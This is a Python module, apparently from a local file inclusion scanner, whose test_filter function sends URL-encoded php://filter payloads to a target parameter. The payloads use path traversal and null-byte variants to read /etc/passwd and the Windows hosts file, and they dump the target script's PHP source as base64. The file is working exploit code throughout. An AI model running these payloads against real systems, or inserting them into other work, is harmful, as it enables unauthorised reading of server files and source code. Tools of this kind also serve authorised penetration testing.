import os
import urllib.parse as urlparse
from src.utils.arguments import args
from src.configs.config import *
from src.utils.stats import stats
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils import colors
from src.configs import config

def test_filter(url, post):
    if(args.verbose):
        print(colors.blue("[i]") + " Testing with filter wrapper...")
    
    tests = []
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd")
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
    
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd%2500")
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd")
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%2500")
    tests.append("php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
    tests.append("php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts") 
    tests.append("php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500") 
    
    script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
    scriptName = script[0]
    #If '/?=' in url
    if(scriptName == ""):
        scriptName = "index"
    
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName)
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + ".php")
    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + "%2500")

    for i in range(len(tests)):
        u, reqHeaders, postTest = prepareRequest(args.param, tests[i], url, post)
        _, br = REQUEST(u, reqHeaders, postTest, proxies, "LFI", "FILTER")
        if(not br): return
        if(i == 1 and args.quick): return

    return